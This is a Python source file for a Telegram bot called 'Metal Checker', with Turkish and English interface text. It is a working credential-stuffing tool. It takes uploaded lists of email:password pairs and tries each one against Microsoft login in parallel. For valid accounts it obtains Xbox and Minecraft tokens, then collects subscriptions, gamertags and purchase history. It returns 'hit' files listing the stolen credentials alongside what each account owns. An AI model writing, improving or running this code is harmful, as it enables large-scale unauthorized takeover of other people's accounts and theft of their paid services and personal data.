import os
import re
import time
import uuid
import json
import threading
import concurrent.futures
import io
from datetime import datetime
import requests
import urllib3
import warnings
import telebot
from telebot import types
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==========================================
# ⚙️ INITIAL SETTINGS & WARNINGS
# ==========================================
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))

# 🚀 ÇÖZÜM 1: Botu çoklu thread (Threaded) desteğiyle ayağa kaldırıyoruz!
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10)

# 🔒 ÇÖZÜM 2: Aynı anda birden fazla edit isteği çakışıp paneli dondurmasın diye kilit koyuyoruz
panel_lock = threading.Lock()

# Ağ kopmalarına karşı en katı istek koruması
session_tg = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
session_tg.mount("https://", HTTPAdapter(max_retries=retries))

def safe_bot_call(func, *args, **kwargs):
    try:
        return func(*args, **kwargs)
    except Exception as e:
        print(f"[⚠️ TELEGRAM API HATASI]: {e}")
        return None

# ==========================================
# 💾 DATABASE / STORAGE EMULATION
# ==========================================
DATA_FILE = "bot_data.json"
if os.path.exists(DATA_FILE):
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        db = json.load(f)
else:
    db = {"admins": [OWNER_ID], "users": {}, "keys": {}, "channels": []}

def save_db():
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=4)

if OWNER_ID not in db["admins"]:
    db["admins"].append(OWNER_ID)
    save_db()

# ==========================================
# 🌍 LOCALIZATION & KEYBOARDS
# ==========================================
LANG = {
    "tr": {
        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin:",
        "main_menu": "📱 *Ana Menü* \n\nBir işlem seçiniz:",
        "btn_check": "🚀 Hesap Tara (.txt)",
        "btn_merge": "📂 Dosya Birleştir",
        "btn_stats": "📊 İstatistiklerim",
        "btn_lang": "🌐 Dil Değiştir (Language)",
        "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır.",
    },
    "en": {
        "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
        "main_menu": "📱 *Main Menu* \n\nPlease choose an option:",
        "btn_check": "🚀 Scan Accounts (.txt)",
        "btn_merge": "📂 Merge Files",
        "btn_stats": "📊 My Statistics",
        "btn_lang": "🌐 Change Language",
        "scan_started": "🚀 Scan started! Dashboard is updating live.",
    }
}

def get_text(user_id, key):
    lang = db["users"].get(str(user_id), {}).get("lang", "en")
    return LANG[lang].get(key, key)

def lang_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("Türkçe 🇹🇷", callback_data="set_lang_tr"),
               types.InlineKeyboardButton("English 🇺🇸", callback_data="set_lang_en"))
    return markup

def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.row(get_text(user_id, "btn_check"), get_text(user_id, "btn_merge"))
    markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
    return markup

# ==========================================
# 🧠 MICROSOFT & XBOX CORE AUTH ENGINE
# ==========================================
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

def get_sftag(session):
    try:
        response = session.get(SFTAG_URL, timeout=10)
        text     = response.text
        match    = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
        if match:
            sftag = match.group(1)
            match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if match: return match.group(1), sftag
    except: pass
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        login_request = session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
        if '#' in login_request.url and login_request.url != SFTAG_URL:
            from urllib.parse import urlparse, parse_qs
            token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
            if token != "None": return token, "success"
        elif 'cancel?mkt=' in login_request.text:
            try:
                d = {
                    'ipt':   re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid':  re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                ret        = session.post(action_url, data=d, allow_redirects=True, timeout=10)
                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                fin        = session.get(return_url, allow_redirects=True, timeout=10)
                token      = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None": return token, "success"
            except: pass
        elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            return None, "2fa"
        elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
            return None, "bad"
    except: pass
    return None, "error"

def get_xbox_token(session, ms_token):
    try:
        payload  = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        response = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except: pass
    return None, None

def get_xsts_token(session, xbox_token):
    try:
        payload  = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
        response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200: return response.json().get('Token')
    except: pass
    return None

def get_minecraft_token(session, uhs, xsts_token):
    try:
        response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=10)
        if response.status_code == 200: return response.json().get('access_token')
    except: pass
    return None

def check_entitlements(session, mc_token):
    found_subs = []
    main_type = None
    try:
        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
        if response.status_code == 200:
            text = response.text
            text_lower = text.lower()
            
            days_left_str = ""
            expiry_match = re.search(r'"expirydate"\s*:\s*"([^"]+)"', text_lower) or re.search(r'"enddate"\s*:\s*"([^"]+)"', text_lower)
            if expiry_match:
                try:
                    exp_raw = expiry_match.group(1).split("t")[0]
                    diff = (datetime.strptime(exp_raw, "%Y-%m-%d") - datetime.now()).days
                    days_left_str = f" ({diff}G Kaldı)" if diff > 0 else " (Süresi Bitmiş)"
                except: pass

            if 'product_game_pass_ultimate' in text_lower or 'ultimate' in text_lower: found_subs.append(f"Game Pass Ultimate💎{days_left_str}")
            elif 'product_game_pass_pc' in text_lower or 'pc_game_pass' in text_lower: found_subs.append(f"Game Pass PC💻{days_left_str}")
            elif 'essential' in text_lower: found_subs.append(f"Game Pass Essential🟢{days_left_str}")
            elif 'standard' in text_lower: found_subs.append(f"Game Pass Standard🎮{days_left_str}")
            elif 'core' in text_lower or 'xbox_live_gold' in text_lower: found_subs.append(f"Game Pass Core⚙️{days_left_str}")
            
            if 'family' in text_lower: found_subs.append("Microsoft 365 Family")
            if 'personal' in text_lower or 'bireysel' in text_lower: found_subs.append("Microsoft 365 Personal")
            if 'business' in text_lower: found_subs.append("Microsoft 365 Business")
            if 'onedrive' in text_lower: found_subs.append("OneDrive Storage")
            if 'clipchamp' in text_lower: found_subs.append("Clipchamp Premium")
            if 'ea play' in text_lower or 'ea_membership' in text_lower: found_subs.append("EA Play")
            if 'ubisoft' in text_lower: found_subs.append("Ubisoft+")
            if 'riot' in text_lower: found_subs.append("Riot Games Perks")
            if 'gta' in text_lower: found_subs.append("GTA+")
            if 'fallout 1st' in text_lower: found_subs.append("Fallout 1st")
            if 'visual studio' in text_lower or 'msdn' in text_lower: found_subs.append("Visual Studio Sub")
            if 'azure' in text_lower: found_subs.append("Azure Credits 🚀")
            if 'copilot' in text_lower: found_subs.append("GitHub Copilot")
            if 'developer' in text_lower: found_subs.append("Xbox Dev Account")
            if 'realms' in text_lower: found_subs.append("Minecraft Realms")
            if 'windows 365' in text_lower: found_subs.append("Windows 365 Cloud")
            if 'casual games' in text_lower: found_subs.append("Casual Games Premium")

            if 'product_game_pass_ultimate' in text: main_type = 'Xbox Game Pass Ultimate'
            elif 'product_game_pass_pc' in text: main_type = 'Xbox Game Pass'
            elif '"product_minecraft"' in text: main_type = 'Minecraft'
    except: pass
    return main_type, found_subs

def get_xbox_profile(session, uhs, xsts_token):
    try:
        response = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,AccountTier", headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
        if response.status_code == 200:
            settings = {s["id"]: s.get("value", "N/A") for s in response.json().get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
    except: pass
    return {"gamertag": "N/A", "tier": "N/A"}

def get_payment_transactions(session, ms_token):
    try:
        url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        response = session.get(url, headers={"Authorization": f"Bearer {ms_token}", "Accept": "application/json"}, timeout=10)
        if response.status_code == 200:
            games = []
            for item in response.json().get("transactions", []):
                title = item.get("description") or item.get("productName")
                if title: games.append(title)
            return list(set(games))
    except: pass
    return []

# ==========================================
# 🔄 CONTEXT STATE MANAGEMENT
# ==========================================
active_scans = {}
user_game_filter = {}

class BotScanContext:
    def __init__(self, chat_id, user_id, combos, filter_str="skip"):
        self.chat_id = chat_id
        self.user_id = user_id
        self.combos = combos
        self.total = len(combos)
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0

        # Canlı Panel Sayaç Odaları
        self.gp_ultimate = 0
        self.gp_pc = 0
        self.gp_essential = 0
        self.gp_standard = 0
        self.gp_core = 0
        self.m365_family = 0
        self.m365_personal = 0
        self.m365_business = 0
        self.onedrive = 0
        self.clipchamp = 0
        self.eaplay = 0
        self.ubisoft = 0
        self.riot = 0
        self.gta = 0
        self.fallout = 0
        self.vstudio = 0
        self.azure = 0
        self.copilot = 0
        self.dev_acc = 0
        self.realms = 0
        self.win355 = 0
        self.casual = 0
        self.minecraft_java = 0

        self.hit_list = []
        self.bad_list = []
        self.twofa_list = []
        self.not_linked_list = []
        self.purchased_items_list = [] 
        self.subscriptions_list = [] 

        self.filter_str = filter_str.lower().strip()
        self.is_running = True
        self.lock = threading.Lock()
        self.message_id = None

def check_account_bot(context, combo):
    if not context.is_running: return
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with context.lock: context.bad += 1; context.checked += 1
            return

        email, password = parts[0], ':'.join(parts[1:])
        session = requests.Session()
        session.verify = False

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag: raise Exception("sftag")

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        if auth_status == "2fa":
            with context.lock: context.twofa += 1; context.checked += 1; context.twofa_list.append(combo)
            return
        elif auth_status == "bad":
            with context.lock: context.bad += 1; context.checked += 1; context.bad_list.append(combo)
            return
        elif auth_status != "success" or not ms_token: raise Exception("ms")

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs: raise Exception("xbox")

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token: raise Exception("xsts")

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token: raise Exception("mc")

        account_type, subs = check_entitlements(session, mc_token)
        purchased_games = get_payment_transactions(session, ms_token)

        if context.filter_str != "skip":
            if not any(context.filter_str in g.lower() for g in purchased_games):
                with context.lock: context.checked += 1
                return

        has_premium_sub = len(subs) > 0
        has_any_game = len(purchased_games) > 0

        capture_detail = (
            f"Email         : {email}\nPassword      : {password}\n"
            f"Gamertag      : {xbox_profile.get('gamertag')}\nTier          : {xbox_profile.get('tier')}\n"
            f"Subscriptions : {', '.join(subs) if has_premium_sub else 'None'}\nGames Count   : {len(purchased_games)}\n{'='*50}"
        )

        with context.lock:
            context.checked += 1
            if not has_premium_sub and not has_any_game:
                context.not_linked_list.append(capture_detail)
            else:
                context.hits += 1
                context.hit_list.append(f"{email}:{password}")
                
                # Sadece oyunu olanlar purchased_items'a
                if has_any_game:
                    games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
                    context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")

                # Sadece aboneliği olanlar Subscriptions'a
                if has_premium_sub:
                    sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
                    context.subscriptions_list.append(sub_entry)

            if account_type and 'Minecraft' in account_type: context.minecraft_java += 1
            for s in subs:
                sl = s.lower()
                if "ultimate" in sl: context.gp_ultimate += 1
                elif "pc" in sl: context.gp_pc += 1
                elif "essential" in sl: context.gp_essential += 1
                elif "standard" in sl: context.gp_standard += 1
                elif "core" in sl or "gold" in sl: context.gp_core += 1
                elif "family" in sl: context.m365_family += 1
                elif "personal" in sl: context.m365_personal += 1
                elif "business" in sl: context.m365_business += 1
                elif "onedrive" in sl: context.onedrive += 1
                elif "clipchamp" in sl: context.clipchamp += 1
                elif "ea play" in sl: context.eaplay += 1
                elif "ubisoft" in sl: context.ubisoft += 1
                elif "riot" in sl: context.riot += 1
                elif "gta" in sl: context.gta += 1
                elif "fallout" in sl: context.fallout += 1
                elif "visual studio" in sl: context.vstudio += 1
                elif "azure" in sl: context.azure += 1
                elif "copilot" in sl: context.copilot += 1
                elif "developer" in sl: context.dev_acc += 1
                elif "realms" in sl: context.realms += 1
                elif "windows 365" in sl: context.win355 += 1
                elif "casual" in sl: context.casual += 1
    except:
        with context.lock: context.errors += 1; context.checked += 1

def generate_panel_text(context):
    pct = (context.checked / context.total) * 100 if context.total > 0 else 0
    return (
        f"⚡ *METAL CHECKER ANLIK PANEL v5.0* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Hit (Oyun/Sub'lı): `{context.hits}`\n"
        f"🔴 Hatalı (Bad): `{context.bad}`\n"
        f"🟡 İki Faktör (2FA): `{context.twofa}`\n"
        f"⚠️ Hata (Error): `{context.errors}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 *ANLIK ABONELİK & OYUN DETAYLARI* 📊\n"
        f"💎 Game Pass Ultimate: `{context.gp_ultimate}`\n"
        f"💻 Game Pass PC: `{context.gp_pc}`\n"
        f"🟢 Game Pass Essential: `{context.gp_essential}`\n"
        f"🎮 Game Pass Standard: `{context.gp_standard}`\n"
        f"⚙️ Game Pass Core/Gold: `{context.gp_core}`\n"
        f"🟩 Minecraft Java/Capes: `{context.minecraft_java}`\n"
        f"📦 Microsoft 365 Family: `{context.m365_family}`\n"
        f"👤 Microsoft 365 Personal: `{context.m365_personal}`\n"
        f"🏢 Microsoft 365 Business: `{context.m365_business}`\n"
        f"☁️ OneDrive Storage: `{context.onedrive}`\n"
        f"🎬 Clipchamp Premium: `{context.clipchamp}`\n"
        f"🎮 EA Play: `{context.eaplay}`\n"
        f"🦅 Ubisoft+: `{context.ubisoft}`\n"
        f"🔥 Riot Games Perks: `{context.riot}`\n"
        f"🚗 GTA+: `{context.gta}`\n"
        f"☢️ Fallout 1st: `{context.fallout}`\n"
        f"💻 Visual Studio Sub: `{context.vstudio}`\n"
        f"🚀 Azure Credits: `{context.azure}`\n"
        f"🤖 GitHub Copilot: `{context.copilot}`\n"
        f"🛠️ Xbox Dev Account: `{context.dev_acc}`\n"
        f"🧱 Minecraft Realms: `{context.realms}`\n"
        f"🖥️ Windows 365 Cloud: `{context.win355}`\n"
        f"🎲 Casual Games Prem: `{context.casual}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 İlerleme: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
    )

def live_refresh_loop(context):
    """⏱️ ÇÖZÜM 3: İstediğin 3 saniyelik stabil ekran tazeleyici döngüsü"""
    last_text = ""
    while context.is_running and context.checked < context.total:
        text = generate_panel_text(context)
        
        # Sadece yazı gerçekten değiştiyse Telegram API'ye istek yollayıp paneli güncelliyoruz
        if text != last_text and context.message_id:
            with panel_lock:
                safe_bot_call(bot.edit_message_text, text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
            last_text = text
            
        time.sleep(3.0) # Tam istediğin gibi 3 saniyede bir ekranı tazeleyecek altın oran

    # Tarama bittiğinde son halini basıyoruz
    text = generate_panel_text(context)
    with panel_lock:
        safe_bot_call(bot.edit_message_text, text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
    
    safe_bot_call(bot.send_message, context.chat_id, "📦 *Tarama bitti! Dosyalarınız temizlenerek oluşturuluyor...*", parse_mode="Markdown")
    
    if context.purchased_items_list:
        bio = io.BytesIO("\n".join(context.purchased_items_list).encode('utf-8'))
        bio.name = "purchased_items.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🎮 purchased_items.txt ({len(context.purchased_items_list)} Hesap)")

    if context.subscriptions_list:
        bio = io.BytesIO("\n".join(context.subscriptions_list).encode('utf-8'))
        bio.name = "Subscriptions.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"📄 Subscriptions.txt ({len(context.subscriptions_list)} Hesap)")

    if context.not_linked_list:
        bio = io.BytesIO("\n".join(context.not_linked_list).encode('utf-8'))
        bio.name = "NotLinked.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption=f"🟨 NotLinked.txt ({len(context.not_linked_list)} Boş Hesap)")

    if context.hit_list:
        bio = io.BytesIO("\n".join(context.hit_list).encode('utf-8'))
        bio.name = "All_Hits_Short.txt"
        safe_bot_call(bot.send_document, context.chat_id, bio, caption="✅ Tüm Hit Giriş Bilgileri")

    if context.chat_id in active_scans: del active_scans[context.chat_id]

# ==========================================
# 🚀 CORE TELEGRAM HANDLERS
# ==========================================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    uid_str = str(message.from_user.id)
    if uid_str not in db["users"]:
        db["users"][uid_str] = {"lang": "tr", "expiry": "2026-12-31", "tier": "PREMIUM", "scans": 0, "hits": 0}
        save_db()
    safe_bot_call(bot.send_message, message.chat.id, LANG["tr"]["welcome"], reply_markup=lang_keyboard(), parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if message.chat.id in active_scans:
        active_scans[message.chat.id].is_running = False
        safe_bot_call(bot.send_message, message.chat.id, "🛑 Tarama durduruldu.")

def process_game_filter_step(message):
    user_game_filter[message.from_user.id] = message.text.strip()
    safe_bot_call(bot.send_message, message.chat.id, "📥 Filtre ayarlandı. Şimdi `.txt` listenizi gönderin.")

@bot.message_handler(func=lambda msg: True, content_types=['text', 'document'])
def handle_all(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if message.content_type == 'text':
        text = message.text
        if text == get_text(user_id, "btn_lang"):
            safe_bot_call(bot.send_message, chat_id, "Dil seçin:", reply_markup=lang_keyboard())
        elif text == get_text(user_id, "btn_check"):
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
            markup.row("skip")
            msg = safe_bot_call(bot.send_message, chat_id, "🔍 Aranacak spesifik oyun adı girin veya geçmek için *skip* deyin:", reply_markup=markup, parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_game_filter_step)

    elif message.content_type == 'document':
        if not message.document.file_name.endswith('.txt'): return
        if chat_id in active_scans: return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        combos = [line.strip() for line in downloaded_file.decode('utf-8', errors='ignore').splitlines() if line.strip() and ':' in line]

        if not combos: return

        game_filter = user_game_filter.get(user_id, "skip")
        context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
        active_scans[chat_id] = context

        text_ilk = generate_panel_text(context)
        init_msg = safe_bot_call(bot.send_message, chat_id, text_ilk, reply_markup=main_keyboard(user_id), parse_mode="Markdown")
        
        if init_msg:
            context.message_id = init_msg.message_id
            
            # Yenileme döngüsünü ve işçi thread havuzunu eş zamanlı başlatıyoruz
            threading.Thread(target=live_refresh_loop, args=(context,), daemon=True).start()
            
            def start_pool():
                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                    futures = [executor.submit(check_account_bot, context, cb) for cb in combos]
                    concurrent.futures.wait(futures)
            threading.Thread(target=start_pool, daemon=True).start()

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data.startswith("set_lang_"):
        lang = call.data.split("_")[2]
        db["users"][str(call.from_user.id)]["lang"] = lang
        save_db()
        safe_bot_call(bot.send_message, call.message.chat.id, get_text(call.from_user.id, "main_menu"), reply_markup=main_keyboard(call.from_user.id), parse_mode="Markdown")

if __name__ == "__main__":
    safe_bot_call(bot.remove_webhook)
    # 🚀 ÇÖZÜM 4: Polling yaparken botun çoklu threadleri işlemesini sağlıyoruz
    bot.infinity_polling(skip_pending=True)

